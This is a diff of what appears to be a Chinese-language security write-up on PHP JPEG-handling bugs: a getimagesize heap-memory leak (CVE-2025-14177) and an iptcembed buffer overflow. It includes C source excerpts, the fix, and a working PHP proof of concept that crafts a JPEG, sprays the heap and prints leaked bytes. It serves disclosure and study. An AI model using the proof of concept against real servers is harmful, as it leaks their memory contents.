@@ -76,7 +76,7 @@ PHP脚本在解释器内的执行生命周期可以简化为三个阶段：词�
   
   
 CVE-2025-14177[1]  
- 严重程度：中等，6.3/10  
+ 严重程度：中等，6.3/10  
 ### 怎么回事  
   
 2025年11月，标准扩展里被发现一个bug：调用原生getimagesize函数，在某些条件下，通过$info返回的APP段数据（比如APP1）后面可能拖着未初始化的堆内存字节。我们把这个发现提交给厂商[2]  
@@ -105,45 +105,45 @@ static int php_read_APP(php_stream * stream, unsigned int marker, zval *info)
   
 {  
   
-    size_t length;  
+    size_t length;  
   
-    char *buffer;  
+    char *buffer;  
   
-    char markername[16];  
+    char markername[16];  
   
-    zval *tmp;  
-  
-  
-    length = php_read2(stream);  
-  
-    if (length < 2) { return 0; }  
-  
-    length -= 2; /* length includes itself */  
+    zval *tmp;  
   
   
-    buffer = emalloc(length);  
+    length = php_read2(stream);  
+  
+    if (length < 2) { return 0; }  
+  
+    length -= 2; /* length includes itself */  
   
   
-    if (php_read_stream_all_chunks(stream, buffer, length) != length) {  
-  
-        efree(buffer);  
-  
-        return 0;  
-  
-    }  
+    buffer = emalloc(length);  
   
   
-    snprintf(markername, sizeof(markername), "APP%d", marker - M_APP0);  
+    if (php_read_stream_all_chunks(stream, buffer, length) != length) {  
   
-    if ((tmp = zend_hash_str_find(Z_ARRVAL_P(info), markername, strlen(markername))) == NULL) {  
+        efree(buffer);  
   
-        add_assoc_stringl(info, markername, buffer, length);  
+        return 0;  
   
-    }  
+    }  
   
-    efree(buffer);  
   
-    return 1;  
+    snprintf(markername, sizeof(markername), "APP%d", marker - M_APP0);  
+  
+    if ((tmp = zend_hash_str_find(Z_ARRVAL_P(info), markername, strlen(markername))) == NULL) {  
+  
+        add_assoc_stringl(info, markername, buffer, length);  
+  
+    }  
+  
+    efree(buffer);  
+  
+    return 1;  
   
 }  
   
@@ -153,24 +153,24 @@ static size_t php_read_stream_all_chunks(php_stream *stream, char *buffer, size_
   
 {  
   
-    size_t read_total = 0;  
+    size_t read_total = 0;  
   
-    do {  
+    do {  
   
-        ssize_t read_now = php_stream_read(stream, buffer, length - read_total);  
+        ssize_t read_now = php_stream_read(stream, buffer, length - read_total);  
   
-        read_total += read_now;  
+        read_total += read_now;  
   
-        if (read_now < stream->chunk_size && read_total != length) {  
+        if (read_now < stream->chunk_size && read_total != length) {  
   
-            return 0;  
+            return 0;  
   
-        }  
+        }  
   
-    } while (read_total < length);  
+    } while (read_total < length);  
   
   
-    return read_total;  
+    return read_total;  
   
 }  
   
@@ -199,7 +199,7 @@ $file = __DIR__ . '/min.jpg';
   
 $chunk = 8192;  
   
-$tail  = 123;  
+$tail  = 123;  
   
 $payload = str_repeat('A', $chunk) . str_repeat('B', $chunk) . str_repeat('X', $tail);  
   
@@ -207,7 +207,7 @@ $app1Len = 2 + strlen($payload);
   
 // Minimal JPEG: SOI + APP1 + SOF0(1x1) + EOI  
   
-$sof  = "\xFF\xC0" . pack('n', 11) . "\x08" . pack('n',1) . pack('n',1) . "\x01\x11\x00";  
+$sof  = "\xFF\xC0" . pack('n', 11) . "\x08" . pack('n',1) . pack('n',1) . "\x01\x11\x00";  
   
 $jpeg = "\xFF\xD8" . "\xFF\xE1" . pack('n', $app1Len) . $payload . $sof . "\xFF\xD9";  
   
@@ -225,9 +225,9 @@ $spray = [];
   
 for ($i = 0; $i < 512; $i++) {  
   
-  $x = $spr; $x[0] = chr($i & 0x7F); // Copy on write -> distinct allocations  
+  $x = $spr; $x[0] = chr($i & 0x7F); // Copy on write -> distinct allocations  
   
-  $spray[$i] = $x;  
+  $spray[$i] = $x;  
   
 }  
   
@@ -243,9 +243,9 @@ $info = null;
   
 if (!@getimagesize($src, $info) || !isset($info['APP1'])) {  
   
-  echo "Error: failed to obtain APP1 from getimagesize().\n";  
+  echo "Error: failed to obtain APP1 from getimagesize().\n";  
   
-  exit(1);  
+  exit(1);  
   
 }  
   
@@ -267,9 +267,9 @@ echo "Returned APP1 head (HEX): ", bin2hex(substr($ret, 0, 16)), "\n";
   
 echo ($exp === $ret)  
   
-  ? "Result: OK - data matches.\n"  
+  ? "Result: OK - data matches.\n"  
   
-  : "Result: VULNERABLE - data differs (corruption/leak).\n";  
+  : "Result: VULNERABLE - data differs (corruption/leak).\n";  
   
 // If found - show marker offset and a short snippet  
   
@@ -277,37 +277,37 @@ $pos = strpos($ret, $marker);
   
 if ($pos !== false) {  
   
-  echo "Leak marker found: offset=$pos (inside returned APP1).\n";  
+  echo "Leak marker found: offset=$pos (inside returned APP1).\n";  
   
-  $ctx = 12;  
+  $ctx = 12;  
   
-  $start = max(0, $pos - $ctx);  
+  $start = max(0, $pos - $ctx);  
   
-  $end = min(strlen($ret), $pos + strlen($marker) + $ctx);  
+  $end = min(strlen($ret), $pos + strlen($marker) + $ctx);  
   
-  $before = substr($ret, $start, $pos - $start);  
+  $before = substr($ret, $start, $pos - $start);  
   
-  $mid    = substr($ret, $pos, strlen($marker));  
+  $mid    = substr($ret, $pos, strlen($marker));  
   
-  $after  = substr($ret, $pos + strlen($marker), $end - ($pos + strlen($marker)));  
+  $after  = substr($ret, $pos + strlen($marker), $end - ($pos + strlen($marker)));  
   
-  $sanitize = function ($s) {  
+  $sanitize = function ($s) {  
   
-    return preg_replace('/[^\x20-\x7E]/', '.', $s);  
+    return preg_replace('/[^\x20-\x7E]/', '.', $s);  
   
-  };  
+  };  
   
-  $asciiLine = $sanitize($before) . '[' . $mid . ']' . $sanitize($after);  
+  $asciiLine = $sanitize($before) . '[' . $mid . ']' . $sanitize($after);  
   
-  $hexLine = bin2hex($before) . '[' . bin2hex($mid) . ']' . bin2hex($after);  
+  $hexLine = bin2hex($before) . '[' . bin2hex($mid) . ']' . bin2hex($after);  
   
-  echo "Snippet with marker (ASCII, marker in []): ", $asciiLine, "\n";  
+  echo "Snippet with marker (ASCII, marker in []): ", $asciiLine, "\n";  
   
-  echo "Snippet with marker (HEX, marker in []):   ", $hexLine, "\n";  
+  echo "Snippet with marker (HEX, marker in []):   ", $hexLine, "\n";  
   
 } else if ($exp !== $ret) {  
   
-  echo "Marker not found, but data differs - still indicates a read bug.\n";  
+  echo "Marker not found, but data differs - still indicates a read bug.\n";  
   
 }  
   
@@ -327,7 +327,7 @@ Leak marker found: offset=16392 (inside returned APP1).
   
 Snippet with marker (ASCII, marker in []): -MARKER-123![LEAK-MARKER-123!]LEAK-MARKER-  
   
-Snippet with marker (HEX, marker in []):   2d4d41524b45522d31323321[4c45414b2d4d41524b45522d31323321]4c45414b2d4d41524b45522d  
+Snippet with marker (HEX, marker in []):   2d4d41524b45522d31323321[4c45414b2d4d41524b45522d31323321]4c45414b2d4d41524b45522d  
   
 **PoC 2：无过滤器场景**  
 。这个变体更贴近真实Web场景（比如从php://input上传并读取），通过控制输入流的发送节奏来触发多块读取。用两个简单脚本：一个模拟上传处理程序（webapp.php），从请求体读JPEG并调用getimagesize；另一个攻击脚本（attacker.php）生成带大APP1段的合法JPEG，分两阶段发送——先发送到APP1段数据的前缀，短暂停顿后再发送剩余部分。默认块大小8192字节，这样就能触发多块读取。  
@@ -372,19 +372,19 @@ iptcembed[4]
   
 if (spool < 2) {  
   
-    if (zend_fstat(fileno(fp), &sb) != 0) {  
+    if (zend_fstat(fileno(fp), &sb) != 0) {  
   
-      fclose(fp);  
+      fclose(fp);  
   
-      RETURN_FALSE;  
+      RETURN_FALSE;  
   
-    }  
+    }  
   
-    spoolbuf = zend_string_safe_alloc(1, iptcdata_len + sizeof(psheader) + 1024 + 1, sb.st_size, 0);  
+    spoolbuf = zend_string_safe_alloc(1, iptcdata_len + sizeof(psheader) + 1024 + 1, sb.st_size, 0);  
   
-    poi = (unsigned char*)ZSTR_VAL(spoolbuf);  
+    poi = (unsigned char*)ZSTR_VAL(spoolbuf);  
   
-    memset(poi, 0, iptcdata_len + sizeof(psheader) + sb.st_size + 1024 + 1);  
+    memset(poi, 0, iptcdata_len + sizeof(psheader) + sb.st_size + 1024 + 1);  
   
 }  
   
@@ -394,17 +394,17 @@ static int php_iptc_get1(FILE *fp, int spool, unsigned char **spoolbuf)
   
 {  
   
-  int c; char cc;  
+  int c; char cc;  
   
-  c = getc(fp);  
+  c = getc(fp);  
   
-  if (c == EOF) return EOF;  
+  if (c == EOF) return EOF;  
   
-  if (spool > 0) { cc = c; PUTC(cc); }  
+  if (spool > 0) { cc = c; PUTC(cc); }  
   
-  if (spoolbuf) *(*spoolbuf)++ = c; // 危险操作：无边界检查  
+  if (spoolbuf) *(*spoolbuf)++ = c; // 危险操作：无边界检查  
   
-  return c;  
+  return c;  
   
 }  
   
@@ -437,13 +437,13 @@ FF D8是SOI起始标记；最小APP0段让解析器接受文件；最小SOS段�
   
 if (spoolbuf) {  
   
-  if (UNEXPECTED(*spoolbuf >= spoolbuf_end)) {  
+  if (UNEXPECTED(*spoolbuf >= spoolbuf_end)) {  
   
-    return EOF;  
+    return EOF;  
   
-  }  
+  }  
   
-  *(*spoolbuf)++ = c;  
+  *(*spoolbuf)++ = c;  
   
 }  
   
@@ -456,19 +456,19 @@ if (spoolbuf) {
 感谢阅读。  
 ### 参考资料  
   
-[1]   
+[1]   
 https://github.com/php/php-src/security/advisories/GHSA-3237-qqm7-mfv7  
   
-[2]   
+[2]   
 https://github.com/php/php-src/issues/20584  
   
-[3]   
+[3]   
 https://www.php.net/manual/en/function.getimagesize.php  
   
-[4]   
+[4]   
 https://www.php.net/manual/en/function.iptcembed.php  
   
-[5]   
+[5]   
 https://swarm.ptsecurity.com/hack-the-elephant-one-bite-at-a-time-jpeg-related-memory-safety-bugs-in-php/  
   
 
